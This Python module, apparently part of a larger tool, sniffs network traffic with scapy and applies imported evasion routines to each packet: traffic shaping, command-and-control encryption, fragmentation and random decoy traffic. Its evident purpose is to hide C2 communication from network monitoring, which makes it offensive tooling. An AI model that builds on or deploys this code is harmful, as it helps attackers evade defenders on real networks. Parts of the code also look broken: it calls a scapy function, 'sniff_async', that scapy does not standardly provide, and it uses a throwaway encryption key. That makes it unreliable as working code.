from scapy.all import *
import logging
import asyncio
import random
from cryptography.fernet import Fernet
from evasion.traffic_shaping import shape_traffic
from evasion.encryption_c2 import encrypt_command_control
from evasion.packet_fragmentation import fragment_packet
from evasion.decoy_traffic import generate_decoy

logger = logging.getLogger(__name__)
cipher_suite = Fernet(Fernet.generate_key())  # Generate a key, manage securely in production

async def handle_packet(packet, config, handlers):
    try:
        # Apply evasion techniques
        packet = shape_traffic(packet, config)
        packet = encrypt_command_control(packet, config)
        
        # Fragmentation might send the packet directly if configured
        if fragment_packet(packet, config):
            return True  # If fragmented, consider the packet handled

        # Generate decoy traffic periodically
        if config.get('evasion', {}).get('use_decoy', False) and random.random() < 0.1:  # 10% chance
            generate_decoy(config)

        # Continue with normal packet handling
        for handler in handlers:
            if await handler(packet, config):
                return True
        return False
    except Exception as e:
        logger.error(f"Error handling packet: {e}")
        return False

async def start_sniffer(config, handlers):
    try:
        loop = asyncio.get_event_loop()
        await sniff_async(prn=lambda x: loop.create_task(handle_packet(x, config, handlers)), iface=config['interface'], store=0)
    except Exception as e:
        logger.error(f"Error in sniffer: {e}")

def encrypt_packet(packet):
    if packet.haslayer(TCP):
        if packet[TCP].payload:
            packet[TCP].payload.load = cipher_suite.encrypt(packet[TCP].payload.load)
    return packet
